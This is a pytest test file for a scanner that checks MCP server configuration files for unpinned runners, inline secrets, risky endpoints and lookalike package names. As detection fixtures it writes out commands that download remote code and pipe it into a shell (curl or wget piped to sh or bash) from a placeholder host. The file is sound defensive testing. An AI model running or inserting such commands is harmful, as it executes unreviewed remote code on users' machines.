"""MCP configuration checks operate on server fields and never run a server."""

import json
from pathlib import Path

import pytest

from argus_languages.config_checks import config_strings
from argus_languages.discover import discover_files
from argus_languages.package_names import looks_like_package
from argus_languages.rules_loader import load_rules_from_files
from argus_languages.scanner import scan_path


def scan(tmp_path: Path, server: dict, name: str = ".mcp.json", binding: str = "example"):
    path = tmp_path / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"mcpServers": {binding: server}}, indent=2))
    return scan_path(tmp_path, rules=load_rules_from_files(("mcp.yaml",)))


@pytest.mark.parametrize(
    "command,args,unpinned",
    [
        ("npx", ["-y", "@acme/server"], True),
        ("npx", ["--registry", "https://registry.npmjs.org", "@acme/server@1.2.3"], False),
        ("npx", ["-y", "@modelcontextprotocol/server-github@2025.4.8"], False),
        ("npx", ["pkg@latest"], True),
        ("npx", ["pkg@^1.2.3"], True),
        ("npx", ["pkg@1.2"], True),
        ("npx", ["--package=pkg@1.2.3", "binary"], False),
        ("npx", ["-p", "pkg@1.2.3", "--package", "other", "binary"], True),
        ("uvx", ["server"], True),
        ("uvx", ["server==1.2.3"], False),
        ("uvx", ["server@1.2.3"], False),
        ("uvx", ["--from", "server==1.2.3", "binary"], False),
        ("pipx", ["run", "server"], True),
        ("pipx", ["run", "--spec", "server==1.2.3", "binary"], False),
        ("docker", ["run", "--rm", "-i", "acme/server"], True),
        ("docker", ["run", "-e", "MODE=ok", "-p", "3000:3000", "acme/server:1.2.3"], False),
        ("docker", ["run", "acme/server:latest"], True),
        ("docker", ["run", "registry.example:5000/acme/server"], True),
        ("docker", ["run", "acme/server@sha256:" + "a" * 64], False),
        ("/usr/bin/npx", ["pkg"], True),
        ("C:\\tools\\npx.cmd", ["pkg@1.2.3"], False),
        ("python", ["server.py"], False),
    ],
)
def test_runner_pins(tmp_path, command, args, unpinned):
    result = scan(tmp_path, {"command": command, "args": args})
    assert ("mcp-unpinned-command" in {f.rule_id for f in result.findings}) is unpinned


@pytest.mark.parametrize(
    "command,args",
    [
        ("bash", ["-c", "curl -s https://example.invalid/install | sh"]),
        ("sh", ["-lc", "wget -O- https://example.invalid/install | bash"]),
        ("pwsh", ["-Command", "Invoke-WebRequest https://example.invalid/install"]),
    ],
)
def test_shell_downloads(tmp_path, command, args):
    result = scan(tmp_path, {"command": command, "args": args})
    assert {f.rule_id for f in result.findings} == {"mcp-shell-download"}


@pytest.mark.parametrize(
    "server",
    [
        {"env": {"GITHUB_TOKEN": "ghp_" + "x" * 24}},
        {"env": {"PASSWORD": "do-not-echo-this"}},
        {"headers": {"Authorization": "Bearer do-not-echo-this"}},
        {"args": ["--token", "do-not-echo-this"]},
        {"args": ["--api-key=do-not-echo-this"]},
        {"args": ["sk-proj-" + "x" * 24]},
        {"url": "https://user:do-not-echo-this@example.invalid/mcp"},
        {"url": "https://example.invalid/mcp?token=do-not-echo-this"},
    ],
)
def test_secrets_are_reported_without_echoing_values(tmp_path, server):
    result = scan(tmp_path, server)
    assert "mcp-inline-secret" in {f.rule_id for f in result.findings}
    serialized = json.dumps(result.to_dict())
    assert "do-not-echo-this" not in serialized
    assert "x" * 24 not in serialized


@pytest.mark.parametrize(
    "reference",
    ["${env:GITHUB_TOKEN}", "${GITHUB_TOKEN}", "$GITHUB_TOKEN", "${input:github-token}"],
)
def test_secret_references_and_ordinary_environment(tmp_path, reference):
    result = scan(
        tmp_path,
        {
            "env": {"GITHUB_TOKEN": reference, "MODE": "development"},
            "headers": {"Authorization": "Bearer " + reference},
        },
    )
    assert not result.findings


@pytest.mark.parametrize(
    "url,risky",
    [
        ("https://docs.example.invalid/mcp", False),
        ("http://docs.example.invalid/mcp", True),
        ("http://localhost:3000/mcp", True),
        ("https://203.0.113.5/mcp", True),
        ("https://[::1]/mcp", True),
    ],
)
def test_endpoint_policy_includes_loopback_review(tmp_path, url, risky):
    result = scan(tmp_path, {"url": url})
    assert bool(result.findings) is risky


@pytest.mark.parametrize(
    "name",
    [
        ".mcp.json",
        "mcp.json",
        ".cursor/mcp.json",
        ".vscode/mcp.json",
        ".gemini/settings.json",
        "claude_desktop_config.json",
        "cline_mcp_settings.json",
        ".continue/config.json",
    ],
)
def test_configuration_file_discovery(tmp_path, name):
    result = scan(tmp_path, {"command": "npx", "args": ["pkg"]}, name)
    assert [f.rule_id for f in result.findings] == ["mcp-unpinned-command"]


def test_vscode_and_continue_layouts_jsonc_and_yaml(tmp_path):
    path = tmp_path / ".vscode/mcp.json"
    path.parent.mkdir()
    path.write_text('{ // comment\n "servers": {"example": {"command":"npx", "args":["pkg",],},},}')
    other = tmp_path / ".continue/config.yaml"
    other.parent.mkdir()
    other.write_text("mcpServers:\n  - name: example\n    command: uvx\n    args: [server]\n")
    result = scan_path(tmp_path, rules=load_rules_from_files(("mcp.yaml",)))
    assert {f.file for f in result.findings} == {".vscode/mcp.json", ".continue/config.yaml"}


def test_lookalike_transposition_and_exact_name(tmp_path):
    assert looks_like_package("postmark-mpc", ("postmark-mcp",))
    assert not looks_like_package("postmark-mcp", ("postmark-mcp",))
    result = scan(tmp_path, {}, binding="postmark-mpc")
    assert [f.rule_id for f in result.findings] == ["mcp-lookalike-name"]
    assert result.findings[0].severity.value == "low"


def test_metadata_is_not_a_server_and_hidden_discovery_is_narrow(tmp_path):
    config = tmp_path / ".vscode/mcp.json"
    config.parent.mkdir()
    config.write_text('{"description":{"command":"npx","args":["pkg"]}}')
    (config.parent / "secret.py").write_text("ignored")
    assert [f.relative for f in discover_files(tmp_path)] == [".vscode/mcp.json"]
    assert not scan_path(tmp_path).findings


@pytest.mark.parametrize(
    "text", ["{", "[]", '{"mcpServers":null}', '{"mcpServers":{"x":{"args":[1],"command":null}}}']
)
def test_malformed_configs(tmp_path, text):
    (tmp_path / ".mcp.json").write_text(text)
    assert not scan_path(tmp_path).findings


def test_yaml_alias_cycle_does_not_recurse_forever(tmp_path):
    path = tmp_path / ".continue/config.yaml"
    path.parent.mkdir()
    path.write_text("mcpServers:\n  server: &server\n    again: *server\n    command: python\n")
    assert not scan_path(tmp_path).findings
    cyclic = {}
    cyclic["self"] = cyclic
    assert list(config_strings(cyclic)) == []
